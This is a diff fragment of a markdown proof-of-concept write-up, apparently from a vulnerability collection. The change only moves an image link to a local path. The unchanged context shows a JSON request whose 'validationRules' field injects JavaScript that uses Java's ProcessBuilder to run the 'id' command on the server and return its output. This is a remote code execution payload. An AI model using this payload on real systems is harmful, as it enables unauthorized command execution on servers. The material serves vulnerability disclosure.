@@ -26,7 +26,7 @@ Connection: close
 {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/8e96cef4-ea6f-4600-b622-9deb360ae42e)
+![image](../../images/8e96cef4-ea6f-4600-b622-9deb360ae42e.png)
 
 
 ## 漏洞来源
